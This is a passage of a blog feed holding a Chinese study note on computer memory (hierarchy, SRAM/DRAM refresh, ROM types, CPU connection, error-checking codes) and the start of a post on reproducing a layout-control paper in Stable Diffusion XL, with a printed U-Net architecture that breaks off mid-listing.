      <link href="/2024/08/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E5%AD%98%E5%82%A8%E5%99%A8/"/>
      <url>/2024/08/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E5%AD%98%E5%82%A8%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="1-存储器概述"><a href="#1-存储器概述" class="headerlink" title="1 存储器概述"></a>1 存储器概述</h1><p>存储器是计算机系统中的记忆设备，用来存放程序和数据，计算机系统的运行速度在很大程度上受存储器制约。I&#x2F;O与存储器直接数据交换大大提高系统性能。</p><h2 id="1-1-存储器的分类"><a href="#1-1-存储器的分类" class="headerlink" title="1.1 存储器的分类"></a>1.1 存储器的分类</h2><h3 id="1-1-1-按存储介质分类"><a href="#1-1-1-按存储介质分类" class="headerlink" title="1.1.1 按存储介质分类"></a>1.1.1 按存储介质分类</h3><p><img src="/2024/08/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E5%AD%98%E5%82%A8%E5%99%A8/image_iIG0Xg6HUz.png"></p><h3 id="1-1-2-按存取方式分类"><a href="#1-1-2-按存取方式分类" class="headerlink" title="1.1.2 按存取方式分类"></a>1.1.2 按存取方式分类</h3><p>分为随机存储器、只读存储器、顺序存取存储器和直接存取存储器。</p><p><img src="/2024/08/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E5%AD%98%E5%82%A8%E5%99%A8/image_DS72d_NnQS.png"></p><h3 id="1-1-3-按在计算机中的作用分类"><a href="#1-1-3-按在计算机中的作用分类" class="headerlink" title="1.1.3 按在计算机中的作用分类"></a>1.1.3 按在计算机中的作用分类</h3><p><img src="/2024/08/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E5%AD%98%E5%82%A8%E5%99%A8/image_8nyq5r1Koi.png"></p><h2 id="1-2-存储器的层次结构"><a href="#1-2-存储器的层次结构" class="headerlink" title="1.2 存储器的层次结构"></a>1.2 存储器的层次结构</h2><p>存储器有3个主要性能指标：速度、容量和位价。</p><p>存储器三个主要特性的关系：</p><p><img src="/2024/08/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E5%AD%98%E5%82%A8%E5%99%A8/image__GCj2edD8a.png"></p><p>存储系统层次结构主要体现在缓存—主存和主存—辅存2个存储层次上。</p><p><img src="/2024/08/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E5%AD%98%E5%82%A8%E5%99%A8/image_tiwblCt9qr.png"></p><p>缓存—主存层次主要解决CPU与主存速度不匹配的问题，主存—辅存层次主要解决存储系统的容量问题。辅存的速度比主存的速度低，而且不能和CPU直接交换信息，但是容量比主存大得多，可以存放大量暂时未用到的信息，当CPU需要用到这些信息时，再将辅存的内容调入主存，供CPU直接访问。</p><p>在主存—辅存这一层次的不断发展中，逐渐形成了虚拟存储系统。</p><hr><h1 id="2-主存储器"><a href="#2-主存储器" class="headerlink" title="2 主存储器"></a>2 主存储器</h1><h2 id="2-1-概述"><a href="#2-1-概述" class="headerlink" title="2.1 概述"></a>2.1 概述</h2><p>主存储器的基本组成如下：</p><p><img src="/2024/08/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E5%AD%98%E5%82%A8%E5%99%A8/image_iNgZcFDkOr.png"></p><p>主存和CPU之间的联系：</p><p><img src="/2024/08/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E5%AD%98%E5%82%A8%E5%99%A8/image_cWXdqvumvP.png"></p><h3 id="2-1-1-主存的技术指标"><a href="#2-1-1-主存的技术指标" class="headerlink" title="2.1.1 主存的技术指标"></a>2.1.1 主存的技术指标</h3><h4 id="2-1-1-1-存储容量"><a href="#2-1-1-1-存储容量" class="headerlink" title="2.1.1.1 存储容量"></a>2.1.1.1 存储容量</h4><p>存储容量：主存存放二进制代码的总位数</p><p>$$<br>存储容量&#x3D;存储单元个数\times 存储字长<br>$$</p><h4 id="2-1-1-2-存储速度"><a href="#2-1-1-2-存储速度" class="headerlink" title="2.1.1.2 存储速度"></a>2.1.1.2 存储速度</h4><p>存储速度是由存储时间和存储周期来表示的。</p><ul><li>存储时间：启动一次存储器操作到完成该操作所需的全部时间</li><li>存取周期：进行连续两次独立的存储器操作（读或写）所需的最小间隔时间</li></ul><h4 id="2-1-1-3-存储器带宽"><a href="#2-1-1-3-存储器带宽" class="headerlink" title="2.1.1.3 存储器带宽"></a>2.1.1.3 存储器带宽</h4><p>单位时间内存储器存取的信息量，单位为位&#x2F;秒。</p><hr><h2 id="2-2-随机存取存储器"><a href="#2-2-随机存取存储器" class="headerlink" title="2.2 随机存取存储器"></a>2.2 随机存取存储器</h2><h3 id="2-2-1-静态RAM"><a href="#2-2-1-静态RAM" class="headerlink" title="2.2.1 静态RAM"></a>2.2.1 静态RAM</h3><p><img src="/2024/08/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E5%AD%98%E5%82%A8%E5%99%A8/image_7epHjJN66d.png"></p><p>静态RAM的工作原理是用触发器存储信息的，不需要再生，但是掉电后原存信息丢失。</p><h3 id="2-2-2-动态RAM"><a href="#2-2-2-动态RAM" class="headerlink" title="2.2.2 动态RAM"></a>2.2.2 动态RAM</h3><p><img src="/2024/08/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E5%AD%98%E5%82%A8%E5%99%A8/image_ftldNHK5gc.png"></p><p>常见的动态RAM基本单元电路有三管式和单管式两种，共同特点都是靠电容存储电荷的原理来存储信息。</p><p>必须在<code>2ms</code>内对其所有存储单元恢复一次原状态，这个过程称为<strong>再生</strong>或<strong>刷新</strong>。</p><h3 id="2-2-3-动态RAM的刷新"><a href="#2-2-3-动态RAM的刷新" class="headerlink" title="2.2.3 动态RAM的刷新"></a>2.2.3 动态RAM的刷新</h3><p>刷新的过程实质上是先将原存信息读出，再由刷新放大器形成原信息并重新写入的再生过程。刷新周期一般为<code>2ms</code>，又称再生周期。</p><p>通常有3种刷新方式：集中刷新、分散刷新和异步刷新。</p><h4 id="2-2-3-1-集中刷新"><a href="#2-2-3-1-集中刷新" class="headerlink" title="2.2.3.1 集中刷新"></a>2.2.3.1 集中刷新</h4><p><strong>集中刷新</strong>是指在规定的一个刷新周期内，对全部存储单元集中一段时间逐行进行刷新，此时须停止读&#x2F;写操作。</p><p><img src="/2024/08/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E5%AD%98%E5%82%A8%E5%99%A8/image_Gi2-qiLoaA.png"></p><ul><li>死区：$0.5\mu s \times 128&#x3D;64 \mu s$</li><li>死时间率：$\frac{128}{4000} \times 100% &#x3D; 3.2%$</li></ul><h4 id="2-2-3-2-分散刷新"><a href="#2-2-3-2-分散刷新" class="headerlink" title="2.2.3.2 分散刷新"></a>2.2.3.2 分散刷新</h4><p>分散刷新是指对每行存储单元的刷新分散到每个存取周期内完成。</p><p><img src="/2024/08/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E5%AD%98%E5%82%A8%E5%99%A8/image_BILflvUp_9.png"></p><ul><li>没有死区</li></ul><h4 id="2-2-3-3-异步刷新"><a href="#2-2-3-3-异步刷新" class="headerlink" title="2.2.3.3 异步刷新"></a>2.2.3.3 异步刷新</h4><p>异步刷新是前两种方式的结合，它既可以缩短“死时间”，又充分利用最大刷新间隔为<code>2ms</code>的特点。</p><p><img src="/2024/08/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E5%AD%98%E5%82%A8%E5%99%A8/image_mGvX5-xsIH.png"></p><p>每隔$15.6\mu s$（$2000\mu s \div 128$）刷新一次。将刷新安排在指令译码阶段，不会出现 “死区”。</p><h3 id="2-2-4-动态-RAM-和静态-RAM-的比较"><a href="#2-2-4-动态-RAM-和静态-RAM-的比较" class="headerlink" title="2.2.4 动态 RAM 和静态 RAM 的比较"></a>2.2.4 动态 RAM 和静态 RAM 的比较</h3><table><thead><tr><th align="center"></th><th align="center">DRAM</th><th align="center">SRAM</th></tr></thead><tbody><tr><td align="center">存储原理</td><td align="center">电容</td><td align="center">触发器</td></tr><tr><td align="center">集成度</td><td align="center">高</td><td align="center">低</td></tr><tr><td align="center">芯片引脚</td><td align="center">少</td><td align="center">多</td></tr><tr><td align="center">功耗</td><td align="center">小</td><td align="center">大</td></tr><tr><td align="center">价格</td><td align="center">低</td><td align="center">高</td></tr><tr><td align="center">速度</td><td align="center">慢</td><td align="center">快</td></tr><tr><td align="center">刷新</td><td align="center">需要</td><td align="center">不需要</td></tr></tbody></table><hr><h2 id="2-3-只读存储器"><a href="#2-3-只读存储器" class="headerlink" title="2.3 只读存储器"></a>2.3 只读存储器</h2><h3 id="2-3-1-掩模-ROM-MROM"><a href="#2-3-1-掩模-ROM-MROM" class="headerlink" title="2.3.1 掩模 ROM ( MROM)"></a>2.3.1 掩模 ROM ( <code>MROM</code>)</h3><p><img src="/2024/08/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E5%AD%98%E5%82%A8%E5%99%A8/image_QykDrUBipP.png"></p><h3 id="2-3-2-PROM-一次性编程-xD"><a href="#2-3-2-PROM-一次性编程-xD" class="headerlink" title="2.3.2 PROM (一次性编程)&#xD;"></a>2.3.2 PROM (一次性编程)&#xD;</h3><p><img src="/2024/08/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E5%AD%98%E5%82%A8%E5%99%A8/image_pUhXRWdVJv.png"></p><h3 id="2-3-3-EPROM-多次性编程"><a href="#2-3-3-EPROM-多次性编程" class="headerlink" title="2.3.3 EPROM(多次性编程)"></a><code>2.3.3 EPROM</code>(多次性编程)</h3><p><code>EPROM</code>是一种可擦除可编程只读存储器。</p><p><img src="/2024/08/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E5%AD%98%E5%82%A8%E5%99%A8/image_f0q7lPZZGI.png"></p><h3 id="2-3-4-EEPROM（多次性编程）"><a href="#2-3-4-EEPROM（多次性编程）" class="headerlink" title="2.3.4 EEPROM（多次性编程）"></a><code>2.3.4 EEPROM</code>（多次性编程）</h3><ul><li>电可擦写</li><li>局部擦写</li><li>全部擦写</li></ul><h3 id="2-3-5-Flash-Memory-闪速型存储器"><a href="#2-3-5-Flash-Memory-闪速型存储器" class="headerlink" title="2.3.5 Flash Memory (闪速型存储器)"></a>2.3.5 Flash Memory (闪速型存储器)</h3><p>存储器访问周期短，功耗低以及与计算机接口简单等优点。</p><hr><h2 id="2-4-存储器与CPU的连接"><a href="#2-4-存储器与CPU的连接" class="headerlink" title="2.4 存储器与CPU的连接"></a>2.4 存储器与CPU的连接</h2><h3 id="2-4-1-存储容量的扩展"><a href="#2-4-1-存储容量的扩展" class="headerlink" title="2.4.1 存储容量的扩展"></a>2.4.1 存储容量的扩展</h3><p><strong>位扩展</strong>：增加存储字长，例如用2片<code>1K×4</code>位 存储芯片组成 <code>1K×8</code>位 的存储器。</p><p><strong>字扩展</strong>：增加存储字的数量，例如用2片<code>1K×8</code>位 存储芯片组成<code>2K×8</code>位 的存储器。</p><p><strong>字位扩展</strong>：既增加存储字的数量，又增加存储字长，例如用8片<code>1K ×4</code>位 存储芯片组成<code>4K× 8</code>位 的存储器<strong>。</strong></p><h3 id="2-4-2-存储器与CPU的连接"><a href="#2-4-2-存储器与CPU的连接" class="headerlink" title="2.4.2 存储器与CPU的连接"></a>2.4.2 存储器与CPU的连接</h3><ul><li><strong>地址线的连接</strong>：CPU的地址线往往比存储芯片的地址线要多，通常将CPU地址线的低位与存储芯片的地址线相连</li><li><strong>数据线的连接</strong>：应使CPU的数据线与存储芯片的数据线位数相等</li><li><strong>读&#x2F;写命令线的连接</strong>：CPU读&#x2F;写命令线一般与存储芯片的读&#x2F;写控制端相连，通常高电平为读，低电平为写</li><li><strong>片选线的连接</strong>：片选有效信号与CPU的访存信号$\overline{\text { MREQ }}$（低电平）有效</li></ul><p>一般步骤：</p><ol><li>写出对应的二进制地址码</li><li>确定芯片的数量及类型</li><li>分配地址线</li><li>确定片选信号</li></ol><p><img src="/2024/08/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E5%AD%98%E5%82%A8%E5%99%A8/image_SRs7l84wJS.png"></p><hr><h2 id="2-5-存储器的校验"><a href="#2-5-存储器的校验" class="headerlink" title="2.5 存储器的校验"></a>2.5 存储器的校验</h2><p>任意两组合法代码之间二进制位数的最少差异称为编码的<strong>最小距离</strong>，编码的纠错 、检错能力与编码的最小距离有关。</p><p>$$<br>L-1&#x3D;D+C(D \geq C)<br>$$</p><ul><li>L：编码的最小距离</li><li>D：检测错误的位数</li><li>C：纠正错误的位数</li></ul>]]></content>
      
      
      <categories>
          
          <category> 专业课 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机组成原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024年西交多媒体小组考核任务2</title>
      <link href="/2024/08/17/2024%E5%B9%B4%E8%A5%BF%E4%BA%A4%E5%A4%9A%E5%AA%92%E4%BD%93%E5%B0%8F%E7%BB%84%E8%80%83%E6%A0%B8%E4%BB%BB%E5%8A%A12/"/>
      <url>/2024/08/17/2024%E5%B9%B4%E8%A5%BF%E4%BA%A4%E5%A4%9A%E5%AA%92%E4%BD%93%E5%B0%8F%E7%BB%84%E8%80%83%E6%A0%B8%E4%BB%BB%E5%8A%A12/</url>
      
        <content type="html"><![CDATA[<h1 id="1-任务要求"><a href="#1-任务要求" class="headerlink" title="1 任务要求"></a>1 任务要求</h1><p>在<code>Diffusers</code>版本的<code>StableDiffusionXL</code>中复现<code>Training-Free Layout Control with Cross-Attention Guidance</code>论文（无代码）。</p><hr><h1 id="2-实现过程"><a href="#2-实现过程" class="headerlink" title="2 实现过程"></a>2 实现过程</h1><p>大体意思就是把两部分代码给整合在一起，主要是把一篇论文的思想复现到<code>StableDiffusionXL</code>中，首先得找一下<code>StableDiffusionXL</code>的代码在哪吧。</p><p>这里论文的主要思想是在一个文生图的基础上，不用做任何的微调和训练就能生成对应布局控制的图像，所以<code>StableDiffusionXL</code>的代码不用实现，直接调用一个API即可。</p><hr><h1 id="3-U-Net网络"><a href="#3-U-Net网络" class="headerlink" title="3 U-Net网络"></a>3 U-Net网络</h1><p>U-Net算法是一种用于图像分割的卷积神经网络（Convolutional Neural Network，简称CNN）架构。它由Olaf Ronneberger等人在2015年提出，主要用于解决医学图像分割的问题。</p><p><img src="/2024/08/17/2024%E5%B9%B4%E8%A5%BF%E4%BA%A4%E5%A4%9A%E5%AA%92%E4%BD%93%E5%B0%8F%E7%BB%84%E8%80%83%E6%A0%B8%E4%BB%BB%E5%8A%A12/image_K2zjBZbC1P.png"></p><p>U-Net算法的特点是采用了U型的网络结构，因此得名U-Net，该网络结构具有编码器（Encoder）和解码器（Decoder）两个部分。</p><p>编码器负责逐步提取输入图像的特征并降低空间分辨率。解码器则通过上采样操作将特征图恢复到原始输入图像的尺寸，并逐步生成分割结果。</p><p>U-Net算法的关键创新是在解码器中引入了跳跃连接（Skip Connections），即将编码器中的特征图与解码器中对应的特征图进行连接。这种跳跃连接可以帮助解码器更好地利用不同层次的特征信息，从而提高图像分割的准确性和细节保留能力。</p><p>网络架构：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br></pre></td><td class="code"><pre><span class="line">UNet2DConditionModel(</span><br><span class="line">  (conv_in)<span class="punctuation">:</span> Conv2d(<span class="number">4</span><span class="punctuation">,</span> <span class="number">320</span><span class="punctuation">,</span> kernel_size=(<span class="number">3</span><span class="punctuation">,</span> <span class="number">3</span>)<span class="punctuation">,</span> stride=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>)<span class="punctuation">,</span> padding=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>))</span><br><span class="line">  (time_proj)<span class="punctuation">:</span> Timesteps()</span><br><span class="line">  (time_embedding)<span class="punctuation">:</span> TimestepEmbedding(</span><br><span class="line">    (linear_1)<span class="punctuation">:</span> Linear(in_features=<span class="number">320</span><span class="punctuation">,</span> out_features=<span class="number">1280</span><span class="punctuation">,</span> bias=True)</span><br><span class="line">    (act)<span class="punctuation">:</span> SiLU()</span><br><span class="line">    (linear_2)<span class="punctuation">:</span> Linear(in_features=<span class="number">1280</span><span class="punctuation">,</span> out_features=<span class="number">1280</span><span class="punctuation">,</span> bias=True)</span><br><span class="line">  )</span><br><span class="line">  (add_time_proj)<span class="punctuation">:</span> Timesteps()</span><br><span class="line">  (add_embedding)<span class="punctuation">:</span> TimestepEmbedding(</span><br><span class="line">    (linear_1)<span class="punctuation">:</span> Linear(in_features=<span class="number">2816</span><span class="punctuation">,</span> out_features=<span class="number">1280</span><span class="punctuation">,</span> bias=True)</span><br><span class="line">    (act)<span class="punctuation">:</span> SiLU()</span><br><span class="line">    (linear_2)<span class="punctuation">:</span> Linear(in_features=<span class="number">1280</span><span class="punctuation">,</span> out_features=<span class="number">1280</span><span class="punctuation">,</span> bias=True)</span><br><span class="line">  )</span><br><span class="line">   (down_blocks) <span class="punctuation">:</span> ModuleList(</span><br><span class="line">    (<span class="number">0</span>)<span class="punctuation">:</span> DownBlock2D(</span><br><span class="line">      (resnets)<span class="punctuation">:</span> ModuleList(</span><br><span class="line">        (<span class="number">0</span><span class="number">-1</span>)<span class="punctuation">:</span> <span class="number">2</span> x ResnetBlock2D(</span><br><span class="line">          (norm1)<span class="punctuation">:</span> GroupNorm(<span class="number">32</span><span class="punctuation">,</span> <span class="number">320</span><span class="punctuation">,</span> eps=<span class="number">1e-05</span><span class="punctuation">,</span> affine=True)</span><br><span class="line">          (conv1)<span class="punctuation">:</span> Conv2d(<span class="number">320</span><span class="punctuation">,</span> <span class="number">320</span><span class="punctuation">,</span> kernel_size=(<span class="number">3</span><span class="punctuation">,</span> <span class="number">3</span>)<span class="punctuation">,</span> stride=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>)<span class="punctuation">,</span> padding=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>))</span><br><span class="line">          (time_emb_proj)<span class="punctuation">:</span> Linear(in_features=<span class="number">1280</span><span class="punctuation">,</span> out_features=<span class="number">320</span><span class="punctuation">,</span> bias=True)</span><br><span class="line">          (norm2)<span class="punctuation">:</span> GroupNorm(<span class="number">32</span><span class="punctuation">,</span> <span class="number">320</span><span class="punctuation">,</span> eps=<span class="number">1e-05</span><span class="punctuation">,</span> affine=True)</span><br><span class="line">          (dropout)<span class="punctuation">:</span> Dropout(p=<span class="number">0.0</span><span class="punctuation">,</span> inplace=False)</span><br><span class="line">          (conv2)<span class="punctuation">:</span> Conv2d(<span class="number">320</span><span class="punctuation">,</span> <span class="number">320</span><span class="punctuation">,</span> kernel_size=(<span class="number">3</span><span class="punctuation">,</span> <span class="number">3</span>)<span class="punctuation">,</span> stride=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>)<span class="punctuation">,</span> padding=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>))</span><br><span class="line">          (nonlinearity)<span class="punctuation">:</span> SiLU()</span><br><span class="line">        )</span><br><span class="line">      )</span><br><span class="line">      